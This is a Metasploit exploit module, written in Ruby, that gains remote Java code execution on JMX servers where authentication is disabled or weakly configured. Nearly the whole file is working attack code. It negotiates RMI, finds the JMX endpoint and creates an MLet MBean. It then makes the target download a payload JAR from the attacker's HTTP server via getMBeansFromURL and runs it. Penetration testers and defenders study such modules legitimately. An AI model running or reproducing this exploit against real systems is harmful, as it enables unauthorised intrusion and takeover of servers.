##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Java::Jmx
  include Msf::Exploit::Remote::HttpServer
  include Msf::Java::Rmi::Client
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Java JMX Server Insecure Configuration Java 
Code Execution',
      'Description'    => %q{
        This module takes advantage a Java JMX interface insecure 
configuration, which would
        allow loading classes from any remote (HTTP) URL. JMX interfaces 
with authentication
        disabled (com.sun.management.jmxremote.authenticate=false) 
should be vulnerable, while
        interfaces with authentication enabled will be vulnerable only 
if a weak configuration
        is deployed (allowing to use javax.management.loading.MLet, 
having a security manager
        allowing to load a ClassLoader MBean, etc.).
      },
      'Author'         =>
        [
          'Braden Thomas', # Attack vector discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 
'https://docs.oracle.com/javase/8/docs/technotes/guides/jmx/JMX_1_4_specification.pdf'],
          ['URL', 'http://www.accuvant.com/blog/exploiting-jmx-rmi']
        ],
      'Platform'       => 'java',
      'Arch'           => ARCH_JAVA,
      'Privileged'     => false,
      'Payload'        => { 'BadChars' => '', 'DisableNops' => true },
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'DefaultOptions' =>
        {
          'WfsDelay' => 10
        },
      'Targets'        =>
        [
          [ 'Generic (Java Payload)', {} ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'May 22 2013'
    ))
 
    register_options([
      Opt::RPORT(1617)
    ], self.class)
 
  end
 
  def on_request_uri(cli, request)
    if request.uri =~ /mlet$/
      jar = "#{rand_text_alpha(8 + rand(8))}.jar"
 
      mlet = "<HTML><mlet code=\"metasploit.JMXPayload\" "
      mlet << "archive=\"#{jar}\" "
      mlet << "name=\"#{@mlet}:name=jmxpayload,id=1\" "
      mlet << "codebase=\"#{get_uri}\"></mlet></HTML>"
      send_response(cli, mlet,
        {
          'Content-Type' => 'application/octet-stream',
          'Pragma'       => 'no-cache'
        })
 
      print_status("Replied to request for mlet")
    elsif request.uri =~ /\.jar$/i
      p = regenerate_payload(cli)
      jar = p.encoded_jar
      paths = [
        ["metasploit", "JMXPayloadMBean.class"],
        ["metasploit", "JMXPayload.class"],
      ]
      jar.add_files(paths, [ Msf::Config.data_directory, "java" ])
 
      send_response(cli, jar.pack,
        {
          'Content-Type' => 'application/java-archive',
          'Pragma'       => 'no-cache'
        })
 
      print_status("Replied to request for payload JAR")
    end
  end
 
  def check
    connect
 
    unless is_rmi?
      return Exploit::CheckCode::Safe
    end
 
    mbean_server = discover_endpoint
    disconnect
    if mbean_server.nil?
      return Exploit::CheckCode::Safe
    end
 
    connect(true, { 'RPORT' => mbean_server[:address], 'RPORT' => 
mbean_server[:port] })
    unless is_rmi?
      return Exploit::CheckCode::Unknown
    end
 
    jmx_endpoint = handshake(mbean_server)
    disconnect
    if jmx_endpoint.nil?
      return Exploit::CheckCode::Detected
    end
 
    Exploit::CheckCode::Appears
  end
 
  def exploit
    @mlet = "MLet#{rand_text_alpha(8 + rand(4)).capitalize}"
    connect
 
    print_status("#{peer} - Sending RMI Header...")
    unless is_rmi?
      fail_with(Failure::NoTarget, "#{peer} - Failed to negotiate RMI 
protocol")
    end
 
    print_status("#{peer} - Discoverig the JMXRMI endpoint...")
    mbean_server = discover_endpoint
    disconnect
    if mbean_server.nil?
      fail_with(Failure::NoTarget, "#{peer} - Failed to discover the 
JMXRMI endpoint")
    else
      print_good("#{peer} - JMXRMI endpoint on 
#{mbean_server[:address]}:#{mbean_server[:port]}")
    end
 
    connect(true, { 'RPORT' => mbean_server[:address], 'RPORT' => 
mbean_server[:port] })
    unless is_rmi?
      fail_with(Failure::NoTarget, "#{peer} - Failed to negotiate RMI 
protocol with the MBean server")
    end
 
    print_status("#{peer} - Proceeding with handshake...")
    jmx_endpoint = handshake(mbean_server)
    if jmx_endpoint.nil?
      fail_with(Failure::NoTarget, "#{peer} - Failed to handshake with 
the MBean server")
    else
      print_good("#{peer} - Handshake with JMX MBean server on 
#{jmx_endpoint[:address]}:#{jmx_endpoint[:port]}")
    end
 
    print_status("#{peer} - Loading payload...")
    unless load_payload(jmx_endpoint)
      fail_with(Failure::Unknown, "#{peer} - Failed to load the 
payload")
    end
 
    print_status("#{peer} - Executing payload...")
    invoke_run_stream = invoke_stream(
      obj_id: jmx_endpoint[:id].chop,
      object: "#{@mlet}:name=jmxpayload,id=1",
      method: 'run'
    )
    send_call(call_data: invoke_run_stream)
 
    disconnect
  end
 
  def is_rmi?
    send_header
    ack = recv_protocol_ack
    if ack.nil?
      return false
    end
 
    true
  end
 
  def discover_endpoint
    send_call(call_data: discovery_stream)
    return_data = recv_return
 
    if return_data.nil?
      vprint_error("#{peer} - Discovery request didn't answer")
      return nil
    end
 
    answer = extract_object(return_data, 1)
 
    if answer.nil?
      vprint_error("#{peer} - Unexpected JMXRMI discovery answer")
      return nil
    end
 
    case answer
    when 'javax.management.remote.rmi.RMIServerImpl_Stub'
      mbean_server = 
extract_unicast_ref(StringIO.new(return_data.contents[2].contents))
    else
      vprint_error("#{peer} - JMXRMI discovery returned unexpected 
object #{answer}")
      return nil
    end
 
    mbean_server
  end
 
  def handshake(mbean)
    vprint_status("#{peer} - Sending handshake / authentication...")
 
    send_call(call_data: handshake_stream(mbean[:id].chop))
    return_data = recv_return
 
    if return_data.nil?
      vprint_error("#{peer} - Failed to send handshake")
      return nil
    end
 
    answer = extract_object(return_data, 1)
 
    if answer.nil?
      vprint_error("#{peer} - Unexpected handshake answer")
      return nil
    end
 
    case answer
    when 'java.lang.SecurityException'
      vprint_error("#{peer} - JMX end point requires authentication, but 
it failed")
      return nil
    when 'javax.management.remote.rmi.RMIConnectionImpl_Stub'
      vprint_good("#{peer} - Handshake completed, proceeding...")
      conn_stub = 
extract_unicast_ref(StringIO.new(return_data.contents[2].contents))
    else
      vprint_error("#{peer} - Handshake returned unexpected object 
#{answer}")
      return nil
    end
 
    conn_stub
  end
 
  def load_payload(conn_stub)
    vprint_status("#{peer} - Getting JMXPayload instance...")
    get_payload_instance = get_object_instance_stream(obj_id: 
conn_stub[:id].chop , name: "#{@mlet}:name=jmxpayload,id=1")
    send_call(call_data: get_payload_instance)
    return_data = recv_return
 
    if return_data.nil?
      vprint_error("#{peer} - The request to getObjectInstance failed")
      return false
    end
 
    answer = extract_object(return_data, 1)
 
    if answer.nil?
      vprint_error("#{peer} - Unexpected getObjectInstance answer")
      return false
    end
 
    case answer
    when 'javax.management.InstanceNotFoundException'
      vprint_warning("#{peer} - JMXPayload instance not found, trying to 
load")
      return load_payload_from_url(conn_stub)
    when 'javax.management.ObjectInstance'
      vprint_good("#{peer} - JMXPayload instance found, using it")
      return true
    else
      vprint_error("#{peer} - getObjectInstance returned unexpected 
object #{answer}")
      return false
    end
  end
 
  def load_payload_from_url(conn_stub)
    vprint_status("Starting service...")
    start_service
 
    vprint_status("#{peer} - Creating javax.management.loading.MLet 
MBean...")
    create_mbean = create_mbean_stream(obj_id: conn_stub[:id].chop, 
name: 'javax.management.loading.MLet')
    send_call(call_data: create_mbean)
    return_data = recv_return
 
    if return_data.nil?
      vprint_error("#{peer} - The request to createMBean failed")
      return false
    end
 
    answer = extract_object(return_data, 1)
 
    if answer.nil?
      vprint_error("#{peer} - Unexpected createMBean answer")
      return false
    end
 
    case answer
    when 'javax.management.InstanceAlreadyExistsException'
      vprint_good("#{peer} - javax.management.loading.MLet already 
exists")
    when 'javax.management.ObjectInstance'
      vprint_good("#{peer} - javax.management.loading.MLet created")
    when 'java.lang.SecurityException'
      vprint_error("#{peer} -  The provided user hasn't enough 
privileges")
      return false
    else
      vprint_error("#{peer} - createMBean returned unexpected object 
#{answer}")
      return false
    end
 
    vprint_status("#{peer} - Getting javax.management.loading.MLet 
instance...")
    get_mlet_instance = get_object_instance_stream(obj_id: 
conn_stub[:id].chop , name: 'DefaultDomain:type=MLet')
    send_call(call_data: get_mlet_instance)
    return_data = recv_return
 
    if return_data.nil?
      vprint_error("#{peer} - The request to getObjectInstance failed")
      return false
    end
 
    answer = extract_object(return_data, 1)
 
    if answer.nil?
      vprint_error("#{peer} - Unexpected getObjectInstance answer")
      return false
    end
 
    case answer
    when 'javax.management.InstanceAlreadyExistsException'
      vprint_good("#{peer} - javax.management.loading.MLet already 
found")
    when 'javax.management.ObjectInstance'
      vprint_good("#{peer} - javax.management.loading.MLet instance 
created")
    else
      vprint_error("#{peer} - getObjectInstance returned unexpected 
object #{answer}")
      return false
    end
 
    vprint_status("#{peer} - Loading MBean Payload with 
javax.management.loading.MLet#getMBeansFromURL...")
 
    invoke_mlet_get_mbean_from_url = invoke_stream(
      obj_id: conn_stub[:id].chop,
      object: 'DefaultDomain:type=MLet',
      method: 'getMBeansFromURL',
      args: { 'java.lang.String' => "#{get_uri}/mlet" }
    )
    send_call(call_data: invoke_mlet_get_mbean_from_url)
    return_data = recv_return
 
    vprint_status("Stopping service...")
    stop_service
 
    if return_data.nil?
      vprint_error("#{peer} - The call to getMBeansFromURL failed")
      return false
    end
 
    answer = extract_object(return_data, 3)
 
    if answer.nil?
      vprint_error("#{peer} - Unexpected getMBeansFromURL answer")
      return false
    end
 
    case answer
    when 'javax.management.InstanceAlreadyExistsException'
      vprint_good("#{peer} - The remote payload was already loaded... 
okey, using it!")
      return true
    when 'javax.management.ObjectInstance'
      vprint_good("#{peer} - The remote payload has been loaded!")
      return true
    else
      vprint_error("#{peer} - getMBeansFromURL returned unexpected 
object #{answer}")
      return false
    end
  end
 
end
